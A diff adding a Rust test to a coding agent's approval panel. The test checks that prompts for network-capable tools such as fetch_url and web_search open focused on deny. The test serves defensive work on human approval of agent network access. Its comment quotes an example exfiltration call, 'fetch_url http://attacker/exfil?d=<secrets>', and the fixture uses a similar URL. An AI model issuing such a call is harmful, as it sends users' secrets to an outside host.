@@ -254,6 +254,49 @@ fn a_parked_root_grant_starts_focused_on_deny() {
     );
 }
 
+/// The network-native tools reach the network without declaring it, so the
+/// deny-by-default rule must recognize them by KIND.
+///
+/// `fetch_url`/`web_search` carry no `network: true` argument — their egress is
+/// intrinsic — so a panel reading only the declared flag opened
+/// `fetch_url http://attacker/exfil?d=<secrets>` focused on approve, with Enter
+/// bound to it. That is the single prompt `park_approval`'s own doc names. They
+/// also record no standing consent, so the panel is y/n and deny is index 1.
+#[test]
+fn a_network_native_prompt_opens_focused_on_deny() {
+    for (tool_name, arguments) in [
+        ("fetch_url", serde_json::json!({ "url": "http://x/exfil" })),
+        ("web_search", serde_json::json!({ "query": "x" })),
+    ] {
+        let mut app = App::new();
+        app.park_approval(deep_code_agent::ApprovalRequest {
+            call_id: "call_1".to_string(),
+            tool_name: tool_name.to_string(),
+            description: String::new(),
+            arguments,
+            risk_level: deep_code_agent::RiskLevel::Medium,
+            requires_sandbox: false,
+            // The whole point: these never set the declared flag.
+            network: false,
+            justification: None,
+            read_only: false,
+            matched_rule: None,
+            resolved_target: None,
+            preview: None,
+            safety_notes: Vec::new(),
+        });
+        assert!(
+            !app.pending_offers_session_consent(),
+            "{tool_name}: a URL-shaped risk takes no consent keyed on the name"
+        );
+        // No recordable consent, so the panel renders y/n and deny is index 1.
+        assert_eq!(
+            app.approval_focus, 1,
+            "{tool_name}: a network-native prompt must open on deny"
+        );
+    }
+}
+
 /// "a" is offered only where the runtime would actually record a consent.
 /// A sub-agent dispatch authorizes what its arguments say (a writing role,
 /// `network: true`) and a job cancel or a compound command carry their risk in
